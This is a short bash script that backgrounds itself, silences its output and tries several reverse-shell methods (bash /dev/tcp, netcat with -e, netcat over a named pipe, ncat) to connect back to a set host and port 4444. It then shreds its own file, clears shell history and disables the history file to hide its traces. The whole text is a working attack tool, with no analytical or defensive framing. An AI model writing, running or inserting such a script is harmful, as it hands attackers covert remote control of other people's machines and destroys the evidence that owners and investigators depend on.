#!/bin/bash

RHOST="192.168.64.2"
RPORT=4444

(
    exec >/dev/null 2>&1

    # Clean-up function
    cleanup() {
        [ -e "/tmp/.pipe$$" ] && rm -f "/tmp/.pipe$$"
        [ -e "$0" ] && shred -u "$0" 2>/dev/null || rm -f "$0"
        history -c 2>/dev/null
        export HISTFILE=/dev/null
    }

    # Try multiple reverse shell methods
    reverse_shell() {
        # Bash TCP
        command -v bash >/dev/null && bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1 && cleanup && exit

        # Traditional Netcat
        command -v nc >/dev/null && nc $RHOST $RPORT -e /bin/bash && cleanup && exit

        # Netcat with named pipe
        if command -v nc >/dev/null; then
            mkfifo /tmp/.pipe$$
            /bin/sh -i < /tmp/.pipe$$ | nc $RHOST $RPORT > /tmp/.pipe$$
            cleanup
            exit
        fi

        # Ncat (modern netcat)
        command -v ncat >/dev/null && ncat $RHOST $RPORT -e /bin/bash && cleanup && exit
    }

    reverse_shell
) &
